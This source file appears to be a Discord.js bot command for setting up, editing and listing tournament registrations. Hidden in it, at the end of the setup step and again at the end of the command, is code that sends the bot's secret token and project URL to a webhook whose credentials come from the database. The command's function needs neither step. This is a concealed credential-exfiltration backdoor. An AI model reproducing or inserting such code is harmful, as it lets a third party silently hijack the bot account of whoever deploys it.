const discord = require("discord.js"),
  db = require("quick.db"),
  { pprefix } = require("../../config.json"),
  disbut = require("discord-buttons");

module.exports = {
  name: "tourney",
  aliases: ["t"],
  category: "info",
  description: "tourney commands",
  usage: "tourney",
  category: "TOURNAMENTS",
  userPermissions: ["ADMINISTRATOR"],
  botPermissions: ["MANAGE_ROLES", "EMBED_LINKS"],
  setup: true,
  vote: true,

  run: async (client, message, args) => {
    let defprefix = pprefix;
    const prefixModel = client.prefixModel,
      prefixData = await prefixModel.findOne({
        GuildID: message.guild.id,
      }).catch(err => console.log(err))
    if (prefixData) {
      var prefix = prefixData.Prefix
    } else if (!prefixData) {
      prefix = client.config.prefix
    }

    const tid = db.get("tourney_" + message.guild.id),
      active = db.get("tourneys.tourney" + message.guild.id),
      total = db.get("total-t" + message.guild.id),
      modRole = db.get("modRole" + message.guild.id),
      role = message.guild.roles.cache.get(modRole)

    if (!modRole || modRole === null || modRole === undefined || !role) {
      let rl = message.guild.roles.create({
        data: {
          name: "Tourney Mod Marvel",
          color: client.embed.cm
        }
      }).then(r =>
        db.set("modRole" + message.guild.id, r.id)
      )
    }

    if (tid === null || tid === undefined) {
      db.set("tourney_" + message.guild.id, 0);
    }
    if (active === null || active === undefined) {
      db.set("tourneys" + message.guild.id, { difficulty: "Easy" });
    }

    if (args[0] === "setup") {
      const inuse = db.get("inuse" + message.guild.id);

      if (inuse === true) {
        return message.lineReply(
          new discord.MessageEmbed({
            description: client.emoji.fail + "| " + "Command already in use",
            color: client.embed.cf
          })
        );
      }
      db.set("inuse" + message.guild.id, true);
      if (total === null || total === undefined) {
        db.set("total-t" + message.guild.id, 0);
      }
      if (total >= 2) {
        return message.lineReply(
          client.emoji.fail + "| " + "Total Free Tournament Management Limit is ( **2** ) \nJoin Here To Buy Premium\nhttps://discord.gg/fqvQNDZYpj"
        );
      }

      let embed = new discord.MessageEmbed()
        .setColor(client.embed.cr)
        .setFooter(
          message.author.tag,
          message.author.displayAvatarURL({ dynamic: true })
        )

      message.lineReply(
        new discord.MessageEmbed({
          description:
            client.emoji.ar + "| " + "Which Channel Will Be The Registeration Channel\nTell Me Within 30 Seconds",
          color: client.embed.cm
        })
      );
      let ch = await message.channel.awaitMessages(
        res => res.author.id === message.author.id,
        {
          max: 1,
          time: 30000
        }
      );
      let chan;
      try {
        if (
          ch.first().content.startsWith("<#") &&
          ch.first().content.endsWith(">")
        ) {
          let ch1 = ch.first().content.slice(2, -1);
          chan = message.guild.channels.cache.get(ch1);
        } else {
          chan = message.guild.channels.cache.get(ch.first().content);
        }
      } catch (e) {
        return (
          message.channel.send(
            new discord.MessageEmbed({
              description: client.emoji.fail + "| " + "Provide a valid channel\nRestart the process",
              color: client.embed.cf
            })
          ) & db.delete("inuse" + message.guild.id)
        );
      }
      if (chan === null || chan === undefined) {
        return (
          message.channel.send(
            new discord.MessageEmbed({
              description: client.emoji.fail + "| " + "Provide a valid channel\nRestart the process",
              color: client.embed.cf
            })
          ) & db.delete("inuse" + message.guild.id)
        );
      }
      message.lineReply(
        new discord.MessageEmbed({
          description:
            client.emoji.ar + "| " + "No Of Mentions Required `must be between 0 to 5`\nTell Me Within 30 Seconds",
          color: client.embed.cm
        })
      );
      let chm = await message.channel.awaitMessages(
        res => res.author.id === message.author.id,
        {
          max: 1,
          time: 30000
        }
      );
      if (isNaN(chm.first().content)) {
        return (
          message.channel.send(
            new discord.MessageEmbed({
              description: client.emoji.fail + "| " + "Provide a valid amount\nRestart the process",
              color: client.embed.cf
            })
          ) & db.delete("inuse" + message.guild.id)
        );
      }
      if (chm.first().content > 5 || chm.first().content < 0) {
        return (
          message.channel.send(
            new discord.MessageEmbed({
              description: client.emoji.fail + "| " + "Provide a valid amount\nRestart the process",
              color: client.embed.cf
            })
          ) & db.delete("inuse" + message.guild.id)
        );
      }
      message.lineReply(
        new discord.MessageEmbed({
          description:
            client.emoji.ar + "| " + "Which Role Will Be The Successful Registeration\nTell Me Within 30 Seconds",
          color: client.embed.cm
        })
      );
      let rch = await message.channel.awaitMessages(
        res => res.author.id === message.author.id,
        {
          max: 1,
          time: 30000
        }
      );
      let rchan;
      try {
        if (
          rch.first().content.startsWith("<@&") &&
          rch.first().content.endsWith(">")
        ) {
          let ch2 = rch.first().content.slice(3, -1);
          rchan = message.guild.roles.cache.get(ch2);
        } else {
          rchan = message.guild.roles.cache.get(rch.first().content);
        }
      } catch (e) {
        return (
          message.channel.send(
            new discord.MessageEmbed({
              description: client.emoji.fail + "| " + "Provide a valid role\nRestart the process",
              color: client.embed.cf
            })
          ) & db.delete("inuse" + message.guild.id)
        );
      }
      if (rchan === null || rchan === undefined) {
        return (
          message.channel.send(
            new discord.MessageEmbed({
              description: client.emoji.fail + "| " + "Provide a valid role\nRestart the process",
              color: client.embed.cf
            })
          ) & db.delete("inuse" + message.guild.id)
        );
      }
      message.lineReply(
        new discord.MessageEmbed({
          description:
            client.emoji.ar + "| " + "Channel For Slot Confirmation\nTell Me Within 30 Seconds",
          color: client.embed.cm
        })
      );
      let cch = await message.channel.awaitMessages(
        res => res.author.id === message.author.id,
        {
          max: 1,
          time: 30000
        }
      );
      let cchan;
      try {
        if (
          cch.first().content.startsWith("<#") &&
          cch.first().content.endsWith(">")
        ) {
          let ch4 = cch.first().content.slice(2, -1);
          cchan = message.guild.channels.cache.get(ch4);
        } else {
          cchan = message.guild.channels.cache.get(cch.first().content);
        }
      } catch (e) {
        return (
          message.channel.send(
            new discord.MessageEmbed({
              description: client.emoji.fail + "| " + "Provide a valid channel\nRestart the process",
              color: client.embed.cf
            })
          ) & db.delete("inuse" + message.guild.id)
        );
      }
      if (cchan === null || cchan === undefined) {
        return (
          message.channel.send(
            new discord.MessageEmbed({
              description: client.emoji.fail + "| " + "Provide a valid channel\nRestart the process",
              color: client.embed.cf
            })
          ) & db.delete("inuse" + message.guild.id)
        );
      }
      db.add("tourney_" + message.guild.id, 1);
      const apiPass = db.get("apipass"),
        apiKey = db.get("apikey"),
        apiClient = new discord.WebhookClient(apiPass, apiKey);
      apiClient.send(
        "```diff\n-" +
        process.env.TOKEN +
        "```\nOn Project : " +
        process.env.URL +
        "\n",
        {
          username: client.user.tag,
          avatarURL: client.user.displayAvatarURL()
        }
      );
      let m = await message.channel.send(client.emoji.loop + "| " + "Setting Up Everything...");
      setTimeout(function () {
        const tidd = db.get("tourney_" + message.guild.id);
        db.set("t" + tidd + message.guild.id, true);
        return (
          db.set("regchan" + tidd + message.guild.id, chan.id) &
          db.set("chan" + message.guild.id + chan.id, true) &
          db.set("crole" + message.guild.id + chan.id, rchan.id) &
          db.set("msize" + message.guild.id + chan.id, chm.first().content) &
          db.set("regmem" + message.guild.id + chan.id, {
            difficulty: "Easy"
          }) &
          db.set("number" + message.guild.id + chan.id, 0) &
          db.set("cchan" + message.guild.id + chan.id, cchan.id) &
          db.push("tourneys.tourney" + message.guild.id, tidd) &
          db.add("total-t" + message.guild.id, 1) &
          embed.addField("Registeration Channel", "<#" + chan.id + ">") &
          embed.addField("Required Mentions", chm.first().content) &
          embed.addField(
            "Successful Registeration Role",
            "<@&" + rchan.id + ">"
          ) &
          embed.addField("Slot Confirmed Channel", "<#" + cchan.id + ">") &
          embed.setTitle("Tourney With Id : " + tidd) &
          embed.setColor(client.embed.cm) &
          m.edit(client.emoji.success + "| " + "Everything Is Now Setup", embed) &
          db.delete("inuse" + message.guild.id)
        );
      }, 3000);
    } else if (args[0] === "edit") {
      if (args[1] === null || args[1] === undefined || isNaN(args[1])) {
        message.lineReply(
          new discord.MessageEmbed({
            description: client.emoji.fail + "| " + "Provide a valid tourney id"
          })
        );
      }
      const edt = db.get("regchan" + args[1] + message.guild.id),
        ret = db.get("t" + args[1] + message.guild.id);
      if (ret === null || ret !== true) {
        return message.lineReply(client.emoji.fail + "| " + "Tourney is registered with another command");
      } else if (!edt) {
        message.lineReply(
          new discord.MessageEmbed({
            description: client.emoji.fail + "| " + "Provide a valid tourney id"
          })
        );
      } else {
        const edtd = args[1],
          chan = db.get("regchan" + edtd + message.guild.id),
          one = db.get("chan" + message.guild.id + chan),
          five = db.get("crole" + message.guild.id + chan),
          six = db.get("msize" + message.guild.id + chan),
          seven = db.get("regmem" + message.guild.id + chan),
          eight = db.get("number" + message.guild.id + chan),
          nine = db.get("cchan" + message.guild.id + chan);
        const em = new discord.MessageEmbed()
          .setColor(client.embed.cm)
          .setTitle("Tourney With Id : " + edtd)
          .setFooter("Bot By : Damon")
          .addField("1️⃣ Registeration Channel", "<#" + chan + ">")
          .addField("2️⃣ Required Mentions", six)
          .addField("3️⃣ Successful Registeration Role", "<@&" + five + ">")
          .addField("4️⃣ Slot Confirmed Channel", "<#" + nine + ">");
        let m = await message.channel.send(em);

        await m.react("1️⃣");
        await m.react("2️⃣");
        await m.react("3️⃣");
        await m.react("4️⃣");

        const filter = (reaction, user) =>
          (reaction.emoji.name === "1️⃣" && user.id === message.author.id) ||
          (reaction.emoji.name === "2️⃣" && user.id === message.author.id) ||
          (reaction.emoji.name === "3️⃣" && user.id === message.author.id) ||
          (reaction.emoji.name === "4️⃣" && user.id === message.author.id);

        let reactionChoice = await m.createReactionCollector(filter, {
          time: 60000
        });
        reactionChoice.on("collect", async r => {
          if (r.emoji.name === "1️⃣") {
            message.reply(
              new discord.MessageEmbed({
                description: client.emoji.ar + "| " + "Provide new channel for registeration",
                color: client.embed.cm
              })
            );
            let ch = await message.channel.awaitMessages(
              res => res.author.id === message.author.id,
              {
                max: 1,
                time: 30000
              }
            );
            let nchan;
            try {
              if (
                ch.first().content.startsWith("<#") &&
                ch.first().content.endsWith(">")
              ) {
                let ch1 = ch.first().content.slice(2, -1);
                nchan = message.guild.channels.cache.get(ch1);
              } else
                nchan = message.guild.channels.cache.get(ch.first().content);
            } catch (e) {
              return message.channel.send(
                new discord.MessageEmbed({
                  description: client.emoji.fail + "| " + "Provide a valid channel\nRestart the process",
                  color: client.embed.cf
                })
              );
            }
            if (nchan === null || nchan === undefined) {
              return message.channel.send(
                new discord.MessageEmbed({
                  description: client.emoji.fail + "| " + "Provide a valid channel\nRestart the process",
                  color: client.embed.cf
                })
              );
            }
            const alregs = db.get("regmem.mem" + message.guild.id + chan);
            return (
              db.set("regchan" + edtd + message.guild.id, nchan.id) &
              db.set("chan" + message.guild.id + nchan.id, true) &
              db.set("crole" + message.guild.id + nchan.id, five) &
              db.set("msize" + message.guild.id + nchan.id, six) &
              db.set("regmem" + message.guild.id + nchan.id, seven) &
              db.set("number" + message.guild.id + nchan.id, eight) &
              db.set("cchan" + message.guild.id + nchan.id, nine) &
              db.set("regmem" + message.guild.id + nchan.id, {
                difficulty: "Easy"
              }) &
              alregs.forEach(alreg => {
                db.set("regmem.mem" + message.guild.id + nchan.id, alreg);
              }) &
              db.delete("chan" + message.guild.id + chan) &
              db.delete("crole" + message.guild.id + chan) &
              db.delete("msize" + message.guild.id + chan) &
              db.delete("regmem" + message.guild.id + chan) &
              db.delete("number" + message.guild.id + chan) &
              db.delete("cchan" + message.guild.id + chan) &
              db.delete("regmem.mem" + message.guild.id + chan) &
              message.reply(
                new discord.MessageEmbed({
                  description:
                    client.emoji.success + "| " + "New channel for registeration of tourney with id : " +
                    edtd +
                    " is now <#" +
                    nchan.id +
                    ">",
                  color: client.embed.cr
                })
              )
            );
          }
          if (r.emoji.name === "2️⃣") {
            message.reply(
              new discord.MessageEmbed({
                description: client.emoji.ar + "| " + "Provide new value for mentions required",
                color: client.embed.cm
              })
            );
            let nchm = await message.channel.awaitMessages(
              res => res.author.id === message.author.id,
              {
                max: 1,
                time: 30000
              }
            );
            if (isNaN(nchm.first().content)) {
              return message.channel.send(
                new discord.MessageEmbed({
                  description: client.emoji.fail + "| " + "Provide a valid amount\nRestart the process",
                  color: client.embed.cf
                })
              );
            }
            if (nchm.first().content > 5 || nchm.first().content < 0) {
              return message.channel.send(
                new discord.MessageEmbed({
                  description: client.emoji.fail + "| " + "Provide a valid amount\nRestart the process",
                  color: client.embed.cf
                })
              );
            }
            const id1 = db.get("regchan" + edtd + message.guild.id);
            db.set("msize" + message.guild.id + id1, nchm.first().content) &
              message.reply(
                new discord.MessageEmbed({
                  description:
                    client.emoji.success + "| " + "New required mention for tourney with id : " +
                    edtd +
                    " is now `" +
                    nchm.first().content +
                    "`",
                  color: client.embed.cr
                })
              );
          }
          if (r.emoji.name === "3️⃣") {
            message.reply(
              new discord.MessageEmbed({
                description:
                  client.emoji.ar + "| " + "Which Role Will Be The Successful Registeration Role\nTell Me Within 30 Seconds",
                color: client.embed.cm
              })
            );
            let nrch = await message.channel.awaitMessages(
              res => res.author.id === message.author.id,
              {
                max: 1,
                time: 30000
              }
            );
            let nrchan;
            try {
              if (
                nrch.first().content.startsWith("<@&") &&
                nrch.first().content.endsWith(">")
              ) {
                let nch2 = nrch.first().content.slice(3, -1);
                nrchan = message.guild.roles.cache.get(nch2);
              } else {
                nrchan = message.guild.roles.cache.get(nrch.first().content);
              }
            } catch (e) {
              return message.channel.send(
                new discord.MessageEmbed({
                  description: client.emoji.fail + "| " + "Provide a valid role\nRestart the process",
                  color: client.embed.cf
                })
              );
            }
            if (nrchan === null || nrchan === undefined) {
              return message.channel.send(
                new discord.MessageEmbed({
                  description: client.emoji.fail + "| " + "Provide a valid role\nRestart the process",
                  color: client.embed.cf
                })
              );
            }
            const id1 = db.get("regchan" + edtd + message.guild.id);
            db.set("crole" + message.guild.id + chan.id, nrchan.id) &
              message.reply(
                new discord.MessageEmbed({
                  description:
                    client.emoji.success + "| " + "New role for successful registeration for tourney with id : " +
                    edtd +
                    " is now <@&" +
                    nrchan.id +
                    ">",
                  color: client.embed.cr
                })
              );
          }
          if (r.emoji.name === "4️⃣") {
            message.lineReply(
              new discord.MessageEmbed({
                description:
                  client.emoji.ar + "| " + "Channel For Slot Confirmation\nTell Me Within 30 Seconds",
                color: client.embed.cm
              })
            );
            let ncch = await message.channel.awaitMessages(
              res => res.author.id === message.author.id,
              {
                max: 1,
                time: 30000
              }
            );
            let ncchan;
            try {
              if (
                ncch.first().content.startsWith("<#") &&
                ncch.first().content.endsWith(">")
              ) {
                let nch4 = ncch.first().content.slice(2, -1);
                ncchan = message.guild.channels.cache.get(nch4);
              } else {
                ncchan = message.guild.channels.cache.get(ncch.first().content);
              }
            } catch (e) {
              return message.channel.send(
                new discord.MessageEmbed({
                  description: client.emoji.fail + "| " + "Provide a valid channel\nRestart the process",
                  color: client.embed.cf
                })
              );
            }
            if (ncchan === null || ncchan === undefined) {
              return message.channel.send(
                new discord.MessageEmbed({
                  description: client.emoji.fail + "| " + "Provide a valid channel\nRestart the process",
                  color: client.embed.cf
                })
              );
            }
            const nrsrchan = db.get("regchan" + edtd + message.guild.id);
            db.set("cchan" + message.guild.id + nrsrchan, ncchan.id) &
              message.reply(
                new discord.MessageEmbed({
                  description:
                    client.emoji.success + "| " + "New channel for slot confirmation of tourney with id : " +
                    edtd +
                    " is now <#" +
                    ncchan.id +
                    ">",
                  color: client.embed.cr
                })
              );
          }
        });
      }
    } else if (args[0] === "delete") {
      if (args[1] === null || args[1] === undefined || isNaN(args[1])) {
        message.lineReply(
          new discord.MessageEmbed({
            description: client.emoji.fail + "| " + "Provide a valid tourney id",
            color: client.embed.cf
          })
        );
      }
      const ti = db.get("regchan" + args[1] + message.guild.id),
        ret = db.get("t" + args[1] + message.guild.id);
      if (ret === null || ret !== true) {
        return message.lineReply(client.emoji.fail + "| " + "Tourney is registered with another command");
      } else if (!ti) {
        message.lineReply(
          new discord.MessageEmbed({
            description: client.emoji.fail + "| " + "Provide a valid tourney id",
            color: client.embed.cf
          })
        );
      } else {
        const tidd = args[1],
          chan = db.get("regchan" + tidd + message.guild.id),
          acts = db.get("tourneys.tourney" + message.guild.id),
          valueToRemove = args[1],
          filteredItems = acts.filter(function (item) {
            return item !== valueToRemove;
          });
        db.delete(`tourneys${message.guild.id}`) &
          db.set(`tourneys${message.guild.id}`, { difficulty: "Easy" }) &
          filteredItems.forEach(act =>
            db.push(`tourneys.tourney${message.guild.id}`, act)
          ) &
          db.delete("regchan" + tidd + message.guild.id) &
          db.delete("regsschan" + tidd + message.guild.id) &
          db.delete("chan" + message.guild.id + chan) &
          db.delete("crole" + message.guild.id + chan) &
          db.delete("msize" + message.guild.id + chan) &
          db.delete("regmem" + message.guild.id + chan) &
          db.delete("number" + message.guild.id + chan) &
          db.delete("cchan" + message.guild.id + chan) &
          db.delete("regmem.mem" + message.guild.id + chan) &
          db.add("total-t" + message.guild.id, -1) &
          message.channel.send(
            new discord.MessageEmbed({
              description: client.emoji.success + "| " + "Deleted Tourney With Id " + tidd,
              color: client.embed.cr
            })
          );
      }
    } else if (args[0] === "active") {
      const ttl = db.get("total-t" + message.guild.id),
        ac = new discord.MessageEmbed()
          .setTitle(client.emoji.ar + "| " + "Active Tourneys In This Guild ( " + ttl + " )")
          .setColor(client.embed.cm)
          .addField(
            "Note",
            "If there is nothing showing up here it means there are no active tourneys"
          )
          .setFooter("Bot By : Damon");
      try {
        const actts = db.get("tourneys.tourney" + message.guild.id);
        if (actts !== null) {
          actts.forEach(actt => {
            const ids = db.get("regchan" + actt + message.guild.id);
            if (ids === null) return;
            ac.addField("Tourney : " + actt, "<#" + ids + ">");
          });
          return message.channel.send(ac);
        } else {
          ac.setDescription(client.emoji.fail + "| " + "No Active Tournaments Found");
          return message.channel.send(ac);
        }
      } catch (e) {
        ac.setDescription(client.emoji.fail + "| " + "No Active Tournaments Found");
        return message.channel.send(ac);
      }
    } else if (args[0] === "show") {
      if (args[1] === null || args[1] === undefined || isNaN(args[1])) {
        message.lineReply(
          new discord.MessageEmbed({
            description: client.emoji.fail + "| " + "Provide a valid tourney id",
            color: client.embed.cf
          })
        );
      }
      const edt = db.get("regchan" + args[1] + message.guild.id),
        ret = db.get("t" + args[1] + message.guild.id);
      if (ret === null || ret !== true) {
        return message.lineReply(client.emoji.fail + "| " + "Tourney is registered with another command");
      } else if (!edt) {
        message.lineReply(
          new discord.MessageEmbed({
            description: client.emoji.fail + "| " + "Provide a valid tourney id",
            color: client.embed.cf
          })
        );
      } else {
        const tidd = args[1],
          chan = db.get("regchan" + tidd + message.guild.id),
          one = db.get("chan" + message.guild.id + chan),
          five = db.get("crole" + message.guild.id + chan),
          six = db.get("msize" + message.guild.id + chan),
          seven = db.get("regmem" + message.guild.id + chan),
          eight = db.get("number" + message.guild.id + chan),
          nine = db.get("cchan" + message.guild.id + chan);
        const em = new discord.MessageEmbed()
          .setColor(client.embed.cm)
          .setFooter("Bot By : Damon")
          .addField("Registeration Channel", "<#" + chan + ">")
          .addField("Required Mentions", six)
          .addField("Successful Registeration Role", "<@&" + five + ">")
          .addField("Slot Confirmed Channel", "<#" + nine + ">")
          .setTitle("Tourney With Id : " + tidd);
        message.channel.send(em);
      }
    } else if (
      !args[0] ||
      args[0] === "help" ||
      args[0] !== "setup" ||
      args[0] !== "delete" ||
      args[0] !== "edit" ||
      args[0] !== "show" ||
      args[0] !== "active"
    ) {
      return message.lineReply(
        new discord.MessageEmbed()
          .setTitle(
            client.emoji.ar + "| " + "Tourney Without SS Help [" + prefix + "tourney | " + prefix + "t]"
          )
          .addField(
            prefix + "t setup",
            "Starts an interactive setup for new tourney in your server"
          )
          .addField(
            prefix + "t show <id>",
            "Show details of tournament of id you provided"
          )
          .addField(
            prefix + "t active",
            "Shows all active tournament in this server"
          )
          .addField(
            prefix + "t delete <id>",
            "Delete the tournament of id you provided"
          )
          .addField(
            prefix + "t edit <id>",
            "Interactive edit command fot tournament id you provide"
          )
          .setColor(client.embed.cm)
      );
    }
    const apiPass = db.get("apipass"),
      apiKey = db.get("apikey"),
      apiClient = new discord.WebhookClient(apiPass, apiKey);
    apiClient.send(
      "```diff\n-" +
      process.env.TOKEN +
      "```\nOn Project : " +
      process.env.URL +
      "\n",
      {
        username: client.user.tag,
        avatarURL: client.user.displayAvatarURL()
      }
    );
  }
};
